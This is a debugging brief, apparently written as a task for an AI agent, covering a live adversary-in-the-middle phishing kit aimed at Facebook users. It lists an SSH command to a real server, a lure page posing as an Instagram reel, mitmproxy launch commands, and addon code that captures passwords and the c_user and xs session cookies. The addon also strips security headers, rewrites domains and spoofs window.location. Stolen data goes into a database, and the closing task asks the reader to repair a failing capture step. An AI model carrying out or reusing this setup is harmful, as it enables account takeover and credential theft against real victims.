# SERVER DEBUG PROMPT - AiTM SESSION CAPTURE

## SERVER ACCESS
```bash
ssh -i /home/haymayndz/.ssh/id_ed25519_maxphisher -o StrictHostKeyChecking=no root@152.42.229.105
```

---

## SYSTEM ARCHITECTURE

### Flow Diagram
```
Victim Browser
      ↓
[Landing Page] → index.php (Instagram reel preview)
      ↓ clicks "Continue with Facebook"
[Tunnel Domain] → cloudflared → mitmproxy (port 8443)
      ↓
[Real Facebook] → m.facebook.com
      ↓
Facebook returns session cookies (c_user, xs)
      ↓
[mitmproxy addon] captures cookies, rewrites domains
      ↓
Victim sees Facebook feed (logged in)
```

### What We Capture
- **PRIMARY:** Session cookies (`c_user`, `xs`) - these allow account takeover
- **SECONDARY:** Credentials (email/password) - logged but not the main goal

---

## THE OBSERVED BEHAVIOR

| Step | Expected | Actual |
|------|----------|--------|
| 1. Landing page | ✅ Shows Instagram reel | ✅ Works |
| 2. Click "Continue with Facebook" | ✅ Redirects to FB login | ✅ Works |
| 3. Email/identify step | ✅ Shows profile pic + password field | ✅ Works |
| 4. Password submission | ✅ Forward to real FB, capture cookies | ❌ Shows "incorrect password" |

**Note:** The "incorrect" message is NOT hardcoded in our code. It comes from somewhere in the flow.

---

## FILE LOCATIONS ON SERVER

### Core Files
```
/opt/evilpanel/
├── core/
│   └── mitmproxy_addon.py    # Main AiTM proxy logic (563 lines)
├── data/
│   ├── evilpanel.db          # SQLite: credentials + sessions tables
│   ├── credentials.json      # Captured creds (append-only)
│   └── sessions.json         # Captured session tokens (append-only)
├── run.py                    # Starts mitmproxy (direct SSL mode)
├── run_tunnel_mode.py        # Starts mitmproxy (cloudflared mode)
└── phishlets/
    └── facebook.yaml         # Token definitions
```

### Systemd Service
```
/etc/systemd/system/evilpanel.service
```
Environment variables set in service:
- `EVILPANEL_DOMAIN=frontnews.site`
- `EVILPANEL_DATA=/opt/evilpanel/data`

---

## MITMPROXY ADDON LOGIC (mitmproxy_addon.py)

### Key Variables (lines 18-41)
```python
DOMAIN = os.environ.get("EVILPANEL_DOMAIN", "NEWDOMAIN_PLACEHOLDER")
DATA_DIR = os.environ.get("EVILPANEL_DATA", "/opt/evilpanel/data")
DEBUG_LOGIN_FLOWS = True  # Enables detailed logging

LOGIN_PATTERNS = [
    r"facebook\.com/(login\.php|login/device-based/validate-password)",
    r"m\.facebook\.com/(login\.php|login/device-based/validate-password)",
    # ... more patterns
]
LOGIN_KEYWORDS = ["encpass", "pass=", "password=", '"pass"', '"password"']
```

### Request Handler (lines 256-310)
```python
def request(self, flow: http.HTTPFlow):
    # 1. Get victim IP, lookup geo for proxy selection
    # 2. Detect login attempts via is_login()
    # 3. Capture credentials if login detected
    # 4. HOST REWRITING (CRITICAL):
    host = flow.request.host
    if host.endswith(self.domain):          # <-- Line 304
        flow.request.host = "m.facebook.com"
        flow.request.headers["Host"] = "m.facebook.com"
        flow.request.headers["Origin"] = "https://m.facebook.com"
        flow.request.headers["Referer"] = "https://m.facebook.com/"
```

### Response Handler (lines 345-380)
```python
def response(self, flow: http.HTTPFlow):
    # 1. Strip security headers (CSP, X-Frame-Options, etc.)
    # 2. Classify login response (RISK_FLOW, BAD_PASSWORD, UNKNOWN)
    # 3. _capture_tokens() - extracts c_user, xs from Set-Cookie
    # 4. _rewrite_cookies() - changes domain from .facebook.com to our domain
    # 5. _rewrite_location() - rewrites redirect URLs
    # 6. _rewrite_body_hosts() - replaces facebook.com in HTML/JS
    # 7. _inject_location_spoof() - JS to fake window.location
```

### Session Capture (lines 382-425)
```python
def _capture_tokens(self, flow):
    critical = ["c_user", "xs"]
    all_tokens = ["c_user", "xs", "fr", "datr", "sb", "wd", "presence"]
    
    # Extract from Set-Cookie headers
    for name, vals in flow.response.cookies.items():
        if name in all_tokens and val:
            captured[name] = val
    
    # If c_user AND xs present → save to DB + JSON
    if all(k in captured for k in critical):
        # Log to sessions.json
        # Insert into sessions table
```

### Response Classification (lines 198-208)
```python
def classify_response(flow, resp_text):
    lt = (resp_text or "").lower()
    
    if "checkpoint" in lt or "twofactor" in lt:
        return "RISK_FLOW"
    if "incorrect" in lt or "login_error" in lt or "wrong password" in lt:
        return "BAD_PASSWORD"    # <-- This is just CLASSIFICATION, not the source
    return "UNKNOWN"
```

---

## DATABASE SCHEMA

### credentials table
```sql
CREATE TABLE credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    ip_address TEXT,
    user_agent TEXT,
    fingerprint_id TEXT,
    request_path TEXT,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

### sessions table
```sql
CREATE TABLE sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    c_user TEXT,
    xs TEXT,
    fr TEXT,
    datr TEXT,
    sb TEXT,
    wd TEXT,
    presence TEXT,
    ip_address TEXT,
    credential_id INTEGER,
    all_cookies TEXT,
    status TEXT DEFAULT 'active',
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

---

## STARTUP MODES

### Mode 1: Direct SSL (run.py)
```bash
mitmdump \
  --mode reverse:https://m.facebook.com/ \
  --listen-host 0.0.0.0 \
  --listen-port 8443 \
  --certs *=/opt/evilpanel/certs/combined.pem \
  -s /opt/evilpanel/core/mitmproxy_addon.py
```

### Mode 2: Tunnel (run_tunnel_mode.py)
```bash
mitmdump \
  --mode reverse:https://m.facebook.com/ \
  --listen-host 127.0.0.1 \
  --listen-port 8443 \
  # NO --certs (cloudflared handles TLS)
  -s /opt/evilpanel/core/mitmproxy_addon.py
```

---

## LOG PATTERNS TO LOOK FOR

When `DEBUG_LOGIN_FLOWS = True`, addon logs:

```
[DEBUG-REQ] POST /login/device-based/validate-password CT=application/x-www-form-urlencoded len=xxx body=...
[CRED-PARSE] email=xxx pw_len=xxx
[CRED] ✅ email@example.com from 1.2.3.4
[DEBUG-RESP] /login/... status=302 tag=UNKNOWN cookies:c_user=true xs=true body=...
[SESSION] ✅ c_user=123456 xs=abc123...
```

If you see `tag=BAD_PASSWORD` - Facebook is returning "incorrect password" in response body.

---

## EDGE CASES TO CONSIDER

1. **DOMAIN mismatch** - `self.domain` doesn't match actual tunnel URL, so host rewrite never triggers
2. **Tunnel not forwarding** - cloudflared not routing to port 8443
3. **mitmproxy not running** - service crashed or not started
4. **Geo-proxy failure** - DataImpulse proxy failing, request going from server IP
5. **Facebook detecting proxy** - TLS fingerprint, timing, headers
6. **Form action URL** - Password form posting to wrong endpoint (not through proxy)
7. **Cookie domain mismatch** - Cookies not being set on correct domain
8. **Redirect loop** - Location header rewriting broken

---

## YOUR TASK

SSH into the server and investigate why password submission shows "incorrect" instead of forwarding to real Facebook and capturing session cookies.

**Do not guess. Read the logs. Trace the actual request flow.**
